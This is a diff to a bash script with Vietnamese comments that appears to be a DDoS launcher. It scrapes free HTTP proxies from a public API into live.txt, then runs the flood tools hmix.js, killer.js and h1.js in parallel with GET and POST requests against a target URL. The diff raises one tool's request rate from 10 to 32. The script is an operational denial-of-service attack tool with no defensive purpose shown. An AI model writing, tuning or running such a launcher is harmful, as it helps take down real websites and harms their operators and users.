@@ -16,7 +16,7 @@ tong=0
 
 # Lấy proxy từ các loại HTTP, HTTPS, SOCKS4, SOCKS5 
 for loai in http; do 
-  lien_ket="https://raw.githubusercontent.com/neganok/NGCSLPRX/refs/heads/main/Proxies/$loai.txt"
+  lien_ket="https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&ssl=all&timeout=2000&protocol=&loai"
   
   # Tải về và xử lý định dạng (đảm bảo mỗi proxy 1 dòng)
   so_luong=$(curl -s "$lien_ket" | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}:[0-9]+' | tee -a "$tep_tam" | wc -l)
@@ -35,9 +35,11 @@ rm -f "$tep_tam"
 wait
 
 export NODE_OPTIONS=--max-old-space-size=8192
+
+
 # Chạy tấn công với hmix.js
 for method in GET POST; do 
-  node hmix.js -m "$method" -u "$URL" -s "$TIME" -p live.txt -t 1 -r 10 --full true -d false &
+  node hmix.js -m "$method" -u "$URL" -s "$TIME" -p live.txt -t 1 -r 32 --full true -d false &
 done
 
 # Chạy tấn công với killer.js
@@ -51,8 +53,6 @@ done
 for method in GET POST; do 
   node h1.js "$method" "$URL" live.txt "$TIME" 999 10 randomstring=true &
 done
-
-
 
 wait
 
